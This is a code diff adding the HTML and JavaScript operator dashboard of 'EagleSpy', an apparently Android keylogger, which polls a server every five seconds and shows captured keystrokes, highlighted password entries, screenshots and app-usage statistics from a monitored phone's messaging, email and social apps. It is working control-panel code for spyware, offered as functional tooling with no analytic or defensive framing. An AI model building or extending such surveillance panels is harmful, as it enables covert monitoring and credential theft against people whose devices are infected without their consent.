@@ -1,0 +1,1033 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EagleSpy Keylogger Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0a0a0f;
+            --bg-secondary: #12121a;
+            --bg-card: #1a1a25;
+            --bg-hover: #252535;
+            --accent-primary: #6366f1;
+            --accent-secondary: #8b5cf6;
+            --accent-success: #10b981;
+            --accent-warning: #f59e0b;
+            --accent-danger: #ef4444;
+            --accent-info: #3b82f6;
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --border-color: #2d2d3a;
+            --gradient-1: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+            --gradient-2: linear-gradient(135deg, #10b981 0%, #3b82f6 100%);
+            --gradient-3: linear-gradient(135deg, #f59e0b 0%, #ef4444 100%);
+            --shadow-glow: 0 0 40px rgba(99, 102, 241, 0.15);
+            --shadow-card: 0 4px 24px rgba(0, 0, 0, 0.4);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: 280px 1fr 380px;
+            min-height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            background: var(--bg-secondary);
+            border-right: 1px solid var(--border-color);
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 32px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .logo-icon {
+            width: 48px;
+            height: 48px;
+            background: var(--gradient-1);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            box-shadow: var(--shadow-glow);
+        }
+
+        .logo-text h1 {
+            font-size: 18px;
+            font-weight: 700;
+            background: var(--gradient-1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .logo-text span {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Device Selector */
+        .device-selector {
+            margin-bottom: 24px;
+        }
+
+        .device-card {
+            background: var(--bg-card);
+            border-radius: 16px;
+            padding: 16px;
+            border: 1px solid var(--border-color);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .device-card:hover, .device-card.active {
+            border-color: var(--accent-primary);
+            box-shadow: var(--shadow-glow);
+        }
+
+        .device-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .device-avatar {
+            width: 44px;
+            height: 44px;
+            background: var(--gradient-2);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .device-info h3 {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .device-info span {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .device-status {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: var(--accent-success);
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--accent-success);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.2); }
+        }
+
+        /* Stats Cards */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: auto;
+        }
+
+        .stat-card {
+            background: var(--bg-card);
+            border-radius: 12px;
+            padding: 16px;
+            border: 1px solid var(--border-color);
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: 700;
+            background: var(--gradient-1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .stat-label {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 4px;
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 24px;
+            overflow-y: auto;
+            max-height: 100vh;
+        }
+
+        .content-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .content-header h2 {
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        .time-filter {
+            display: flex;
+            gap: 8px;
+        }
+
+        .filter-btn {
+            padding: 8px 16px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            background: var(--bg-card);
+            color: var(--text-secondary);
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .filter-btn:hover, .filter-btn.active {
+            background: var(--accent-primary);
+            border-color: var(--accent-primary);
+            color: white;
+        }
+
+        /* Timeline */
+        .timeline-container {
+            background: var(--bg-card);
+            border-radius: 20px;
+            border: 1px solid var(--border-color);
+            overflow: hidden;
+        }
+
+        .timeline-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .timeline-header h3 {
+            font-size: 16px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .timeline-header h3 i {
+            color: var(--accent-primary);
+        }
+
+        .timeline-body {
+            max-height: 500px;
+            overflow-y: auto;
+            padding: 16px;
+        }
+
+        .timeline-body::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .timeline-body::-webkit-scrollbar-track {
+            background: var(--bg-secondary);
+        }
+
+        .timeline-body::-webkit-scrollbar-thumb {
+            background: var(--accent-primary);
+            border-radius: 3px;
+        }
+
+        /* Keylog Entry */
+        .keylog-entry {
+            display: flex;
+            gap: 16px;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 8px;
+            background: var(--bg-secondary);
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+        }
+
+        .keylog-entry:hover {
+            border-color: var(--border-color);
+            transform: translateX(4px);
+        }
+
+        .keylog-time {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--text-muted);
+            min-width: 70px;
+        }
+
+        .keylog-app {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            min-width: 140px;
+        }
+
+        .app-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+
+        .app-icon.chrome { background: linear-gradient(135deg, #4285f4, #34a853); }
+        .app-icon.whatsapp { background: linear-gradient(135deg, #25d366, #128c7e); }
+        .app-icon.instagram { background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
+        .app-icon.facebook { background: linear-gradient(135deg, #1877f2, #3b5998); }
+        .app-icon.telegram { background: linear-gradient(135deg, #0088cc, #229ed9); }
+        .app-icon.twitter { background: linear-gradient(135deg, #1da1f2, #14171a); }
+        .app-icon.gmail { background: linear-gradient(135deg, #ea4335, #fbbc05); }
+        .app-icon.youtube { background: linear-gradient(135deg, #ff0000, #cc0000); }
+        .app-icon.tiktok { background: linear-gradient(135deg, #000000, #25f4ee); }
+        .app-icon.snapchat { background: linear-gradient(135deg, #fffc00, #ffd700); color: #000; }
+        .app-icon.default { background: var(--gradient-1); }
+
+        .app-name {
+            font-size: 12px;
+            color: var(--text-secondary);
+            max-width: 100px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .keylog-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .keystroke {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            padding: 6px 12px;
+            background: var(--bg-primary);
+            border-radius: 6px;
+            display: inline-block;
+            max-width: fit-content;
+        }
+
+        .keystroke.password {
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.2), rgba(239, 68, 68, 0.1));
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .keystroke.password::before {
+            content: '🔐 ';
+        }
+
+        .keystroke.special {
+            color: var(--accent-warning);
+            font-style: italic;
+        }
+
+        .field-info {
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+
+        .event-badge {
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .event-badge.text { background: rgba(99, 102, 241, 0.2); color: var(--accent-primary); }
+        .event-badge.click { background: rgba(16, 185, 129, 0.2); color: var(--accent-success); }
+        .event-badge.focus { background: rgba(245, 158, 11, 0.2); color: var(--accent-warning); }
+        .event-badge.app { background: rgba(139, 92, 246, 0.2); color: var(--accent-secondary); }
+
+        /* Screenshot Panel */
+        .screenshot-panel {
+            background: var(--bg-secondary);
+            border-left: 1px solid var(--border-color);
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .panel-header h3 {
+            font-size: 16px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .screenshot-grid {
+            display: grid;
+            gap: 16px;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .screenshot-card {
+            background: var(--bg-card);
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .screenshot-card:hover {
+            transform: scale(1.02);
+            border-color: var(--accent-primary);
+            box-shadow: var(--shadow-glow);
+        }
+
+        .screenshot-image {
+            width: 100%;
+            aspect-ratio: 9/16;
+            object-fit: cover;
+            background: var(--bg-primary);
+        }
+
+        .screenshot-meta {
+            padding: 12px;
+        }
+
+        .screenshot-meta .app-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 10px;
+            background: var(--bg-secondary);
+            border-radius: 20px;
+            font-size: 11px;
+            margin-bottom: 8px;
+        }
+
+        .screenshot-meta time {
+            font-size: 12px;
+            color: var(--text-muted);
+            display: block;
+        }
+
+        /* Heatmap Section */
+        .heatmap-section {
+            background: var(--bg-card);
+            border-radius: 20px;
+            border: 1px solid var(--border-color);
+            padding: 24px;
+            margin-top: 24px;
+        }
+
+        .heatmap-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .heatmap-grid {
+            display: grid;
+            grid-template-columns: repeat(24, 1fr);
+            gap: 4px;
+        }
+
+        .heatmap-cell {
+            aspect-ratio: 1;
+            border-radius: 4px;
+            background: var(--bg-secondary);
+            position: relative;
+            transition: all 0.2s ease;
+        }
+
+        .heatmap-cell:hover {
+            transform: scale(1.3);
+            z-index: 10;
+        }
+
+        .heatmap-cell.level-1 { background: rgba(99, 102, 241, 0.2); }
+        .heatmap-cell.level-2 { background: rgba(99, 102, 241, 0.4); }
+        .heatmap-cell.level-3 { background: rgba(99, 102, 241, 0.6); }
+        .heatmap-cell.level-4 { background: rgba(99, 102, 241, 0.8); }
+        .heatmap-cell.level-5 { background: var(--accent-primary); }
+
+        .heatmap-labels {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 12px;
+        }
+
+        .heatmap-labels span {
+            font-size: 10px;
+            color: var(--text-muted);
+        }
+
+        /* App Usage Chart */
+        .app-usage-section {
+            background: var(--bg-card);
+            border-radius: 20px;
+            border: 1px solid var(--border-color);
+            padding: 24px;
+            margin-top: 24px;
+        }
+
+        .app-usage-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 16px;
+        }
+
+        .app-usage-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .usage-bar-container {
+            flex: 1;
+            height: 8px;
+            background: var(--bg-secondary);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .usage-bar {
+            height: 100%;
+            border-radius: 4px;
+            transition: width 0.5s ease;
+        }
+
+        .usage-bar.chrome { background: var(--gradient-1); }
+        .usage-bar.whatsapp { background: linear-gradient(90deg, #25d366, #128c7e); }
+        .usage-bar.instagram { background: linear-gradient(90deg, #f09433, #bc1888); }
+
+        .usage-percent {
+            font-size: 12px;
+            font-weight: 600;
+            min-width: 40px;
+            text-align: right;
+        }
+
+        /* Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: var(--bg-card);
+            border-radius: 24px;
+            border: 1px solid var(--border-color);
+            max-width: 90vw;
+            max-height: 90vh;
+            overflow: hidden;
+        }
+
+        .modal-image {
+            max-width: 100%;
+            max-height: 80vh;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        /* Live indicator */
+        .live-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 14px;
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 20px;
+            font-size: 12px;
+            color: var(--accent-danger);
+            font-weight: 600;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--accent-danger);
+            border-radius: 50%;
+            animation: live-pulse 1.5s infinite;
+        }
+
+        @keyframes live-pulse {
+            0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
+            50% { opacity: 0.8; box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
+        }
+
+        /* Responsive */
+        @media (max-width: 1400px) {
+            .dashboard {
+                grid-template-columns: 260px 1fr;
+            }
+            .screenshot-panel {
+                display: none;
+            }
+        }
+
+        @media (max-width: 900px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
+            .sidebar {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="logo">
+                <div class="logo-icon">🦅</div>
+                <div class="logo-text">
+                    <h1>EagleSpy</h1>
+                    <span>Keylogger Dashboard</span>
+                </div>
+            </div>
+
+            <div class="device-selector">
+                <div class="device-card active" id="deviceCard">
+                    <div class="device-header">
+                        <div class="device-avatar">📱</div>
+                        <div class="device-info">
+                            <h3 id="deviceName">Loading...</h3>
+                            <span id="deviceModel">Android Device</span>
+                        </div>
+                    </div>
+                    <div class="device-status">
+                        <div class="status-dot"></div>
+                        <span>Connected • Live</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value" id="totalKeystrokes">0</div>
+                    <div class="stat-label">Keystrokes</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="totalScreenshots">0</div>
+                    <div class="stat-label">Screenshots</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="appsUsed">0</div>
+                    <div class="stat-label">Apps Used</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="sessionTime">0h</div>
+                    <div class="stat-label">Session</div>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <div class="content-header">
+                <h2>🔑 Keystroke Timeline</h2>
+                <div style="display: flex; align-items: center; gap: 16px;">
+                    <div class="live-indicator">
+                        <div class="live-dot"></div>
+                        LIVE
+                    </div>
+                    <div class="time-filter">
+                        <button class="filter-btn active">All</button>
+                        <button class="filter-btn">Today</button>
+                        <button class="filter-btn">1 Hour</button>
+                        <button class="filter-btn">15 Min</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="timeline-container">
+                <div class="timeline-header">
+                    <h3><i class="fas fa-keyboard"></i> Captured Input</h3>
+                    <span id="keystrokeCount" style="color: var(--text-muted); font-size: 13px;">Loading...</span>
+                </div>
+                <div class="timeline-body" id="timelineBody">
+                    <!-- Keylog entries will be inserted here -->
+                </div>
+            </div>
+
+            <!-- Activity Heatmap -->
+            <div class="heatmap-section">
+                <div class="heatmap-header">
+                    <h3 style="display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-fire" style="color: var(--accent-warning);"></i>
+                        Activity Heatmap (24h)
+                    </h3>
+                </div>
+                <div class="heatmap-grid" id="heatmapGrid">
+                    <!-- Heatmap cells -->
+                </div>
+                <div class="heatmap-labels">
+                    <span>00:00</span>
+                    <span>06:00</span>
+                    <span>12:00</span>
+                    <span>18:00</span>
+                    <span>23:59</span>
+                </div>
+            </div>
+
+            <!-- App Usage -->
+            <div class="app-usage-section">
+                <h3 style="display: flex; align-items: center; gap: 10px;">
+                    <i class="fas fa-chart-pie" style="color: var(--accent-secondary);"></i>
+                    App Usage Distribution
+                </h3>
+                <div class="app-usage-list" id="appUsageList">
+                    <!-- App usage items -->
+                </div>
+            </div>
+        </main>
+
+        <!-- Screenshot Panel -->
+        <aside class="screenshot-panel">
+            <div class="panel-header">
+                <h3><i class="fas fa-camera" style="color: var(--accent-info);"></i> Screenshots</h3>
+                <span id="screenshotCount" style="color: var(--text-muted); font-size: 13px;">0 captured</span>
+            </div>
+            <div class="screenshot-grid" id="screenshotGrid">
+                <!-- Screenshots will be inserted here -->
+            </div>
+        </aside>
+    </div>
+
+    <!-- Image Modal -->
+    <div class="modal-overlay" id="imageModal">
+        <button class="modal-close" onclick="closeModal()">
+            <i class="fas fa-times"></i>
+        </button>
+        <div class="modal-content">
+            <img id="modalImage" class="modal-image" src="" alt="Screenshot">
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const API_BASE = '/api/keylogger';
+        const DEVICE_ID = new URLSearchParams(window.location.search).get('device_id') || 'default';
+        const REFRESH_INTERVAL = 5000;
+
+        // App icons mapping
+        const APP_ICONS = {
+            'com.android.chrome': { icon: 'fab fa-chrome', class: 'chrome', name: 'Chrome' },
+            'com.whatsapp': { icon: 'fab fa-whatsapp', class: 'whatsapp', name: 'WhatsApp' },
+            'com.instagram.android': { icon: 'fab fa-instagram', class: 'instagram', name: 'Instagram' },
+            'com.facebook.katana': { icon: 'fab fa-facebook', class: 'facebook', name: 'Facebook' },
+            'org.telegram.messenger': { icon: 'fab fa-telegram', class: 'telegram', name: 'Telegram' },
+            'com.twitter.android': { icon: 'fab fa-twitter', class: 'twitter', name: 'Twitter' },
+            'com.google.android.gm': { icon: 'fas fa-envelope', class: 'gmail', name: 'Gmail' },
+            'com.google.android.youtube': { icon: 'fab fa-youtube', class: 'youtube', name: 'YouTube' },
+            'com.zhiliaoapp.musically': { icon: 'fab fa-tiktok', class: 'tiktok', name: 'TikTok' },
+            'com.snapchat.android': { icon: 'fab fa-snapchat', class: 'snapchat', name: 'Snapchat' }
+        };
+
+        // Initialize dashboard
+        async function init() {
+            generateHeatmap();
+            await fetchData();
+            setInterval(fetchData, REFRESH_INTERVAL);
+        }
+
+        // Fetch data from API
+        async function fetchData() {
+            try {
+                const response = await fetch(`${API_BASE}/data/${DEVICE_ID}`);
+                const data = await response.json();
+                updateDashboard(data);
+            } catch (error) {
+                console.error('Error fetching data:', error);
+            }
+        }
+
+        // Update dashboard with data
+        function updateDashboard(data) {
+            // Update stats
+            document.getElementById('deviceName').textContent = data.device_id || 'Unknown Device';
+            document.getElementById('totalKeystrokes').textContent = formatNumber(data.stats?.total_keystrokes || 0);
+            document.getElementById('totalScreenshots').textContent = data.stats?.total_screenshots || 0;
+            document.getElementById('appsUsed').textContent = data.stats?.apps_used?.length || 0;
+            document.getElementById('keystrokeCount').textContent = `${data.keylogs?.length || 0} entries`;
+            document.getElementById('screenshotCount').textContent = `${data.screenshots?.length || 0} captured`;
+
+            // Calculate session time
+            if (data.stats?.first_activity && data.stats?.last_activity) {
+                const duration = (data.stats.last_activity - data.stats.first_activity) / 3600000;
+                document.getElementById('sessionTime').textContent = `${duration.toFixed(1)}h`;
+            }
+
+            // Update timeline
+            updateTimeline(data.keylogs || []);
+
+            // Update screenshots
+            updateScreenshots(data.screenshots || []);
+
+            // Update app usage
+            updateAppUsage(data.keylogs || []);
+        }
+
+        // Update timeline
+        function updateTimeline(keylogs) {
+            const container = document.getElementById('timelineBody');
+            container.innerHTML = '';
+
+            keylogs.slice(0, 100).forEach(log => {
+                const entry = createKeylogEntry(log);
+                container.appendChild(entry);
+            });
+        }
+
+        // Create keylog entry element
+        function createKeylogEntry(log) {
+            const div = document.createElement('div');
+            div.className = 'keylog-entry';
+
+            const time = new Date(log.timestamp).toLocaleTimeString('en-US', {
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+
+            const appInfo = APP_ICONS[log.app] || { icon: 'fas fa-mobile-alt', class: 'default', name: getAppName(log.app) };
+            const isPassword = log.input_type === 'password';
+            const isSpecial = log.keystroke?.startsWith('[');
+
+            div.innerHTML = `
+                <div class="keylog-time">${time}</div>
+                <div class="keylog-app">
+                    <div class="app-icon ${appInfo.class}">
+                        <i class="${appInfo.icon}"></i>
+                    </div>
+                    <span class="app-name">${appInfo.name}</span>
+                </div>
+                <div class="keylog-content">
+                    <div class="keystroke ${isPassword ? 'password' : ''} ${isSpecial ? 'special' : ''}">${escapeHtml(log.keystroke)}</div>
+                    ${log.field_id ? `<div class="field-info">Field: ${log.field_id}</div>` : ''}
+                </div>
+                <span class="event-badge ${getEventClass(log.event_type)}">${log.event_type}</span>
+            `;
+
+            return div;
+        }
+
+        // Update screenshots
+        function updateScreenshots(screenshots) {
+            const container = document.getElementById('screenshotGrid');
+            container.innerHTML = '';
+
+            screenshots.slice(0, 20).forEach(ss => {
+                const card = document.createElement('div');
+                card.className = 'screenshot-card';
+                card.onclick = () => openModal(ss.image_url);
+
+                const time = new Date(ss.timestamp).toLocaleString();
+                const appInfo = APP_ICONS[ss.app] || { icon: 'fas fa-mobile-alt', name: getAppName(ss.app) };
+
+                card.innerHTML = `
+                    <img class="screenshot-image" src="${ss.image_url}" alt="Screenshot" loading="lazy">
+                    <div class="screenshot-meta">
+                        <div class="app-badge">
+                            <i class="${appInfo.icon}"></i>
+                            ${appInfo.name}
+                        </div>
+                        <time>${time}</time>
+                    </div>
+                `;
+
+                container.appendChild(card);
+            });
+        }
+
+        // Update app usage
+        function updateAppUsage(keylogs) {
+            const container = document.getElementById('appUsageList');
+            container.innerHTML = '';
+
+            // Count app usage
+            const appCounts = {};
+            keylogs.forEach(log => {
+                if (log.app) {
+                    appCounts[log.app] = (appCounts[log.app] || 0) + 1;
+                }
+            });
+
+            // Sort and display top apps
+            const total = Object.values(appCounts).reduce((a, b) => a + b, 0);
+            const sorted = Object.entries(appCounts).sort((a, b) => b[1] - a[1]).slice(0, 5);
+
+            sorted.forEach(([app, count]) => {
+                const percent = ((count / total) * 100).toFixed(1);
+                const appInfo = APP_ICONS[app] || { icon: 'fas fa-mobile-alt', class: 'default', name: getAppName(app) };
+
+                const item = document.createElement('div');
+                item.className = 'app-usage-item';
+                item.innerHTML = `
+                    <div class="app-icon ${appInfo.class}" style="width: 32px; height: 32px; font-size: 14px;">
+                        <i class="${appInfo.icon}"></i>
+                    </div>
+                    <span style="min-width: 100px; font-size: 13px;">${appInfo.name}</span>
+                    <div class="usage-bar-container">
+                        <div class="usage-bar ${appInfo.class}" style="width: ${percent}%"></div>
+                    </div>
+                    <span class="usage-percent">${percent}%</span>
+                `;
+                container.appendChild(item);
+            });
+        }
+
+        // Generate heatmap
+        function generateHeatmap() {
+            const container = document.getElementById('heatmapGrid');
+            container.innerHTML = '';
+
+            for (let i = 0; i < 24; i++) {
+                const cell = document.createElement('div');
+                cell.className = 'heatmap-cell';
+                // Random level for demo - in real app, calculate from data
+                const level = Math.floor(Math.random() * 6);
+                if (level > 0) cell.classList.add(`level-${level}`);
+                cell.title = `${i}:00 - ${i}:59`;
+                container.appendChild(cell);
+            }
+        }
+
+        // Helper functions
+        function getAppName(packageName) {
+            if (!packageName) return 'Unknown';
+            const parts = packageName.split('.');
+            return parts[parts.length - 1] || packageName;
+        }
+
+        function getEventClass(eventType) {
+            const classes = {
+                'TEXT_CHANGED': 'text',
+                'CLICK': 'click',
+                'FOCUS': 'focus',
+                'APP_SWITCH': 'app',
+                'WINDOW_CHANGE': 'app'
+            };
+            return classes[eventType] || 'text';
+        }
+
+        function formatNumber(num) {
+            if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
+            if (num >= 1000) return (num / 1000).toFixed(1) + 'K';
+            return num.toString();
+        }
+
+        function escapeHtml(text) {
+            if (!text) return '';
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function openModal(imageUrl) {
+            document.getElementById('modalImage').src = imageUrl;
+            document.getElementById('imageModal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('imageModal').classList.remove('active');
+        }
+
+        // Close modal on escape key
+        document.addEventListener('keydown', e => {
+            if (e.key === 'Escape') closeModal();
+        });
+
+        // Initialize
+        init();
+    </script>
+</body>
+</html>
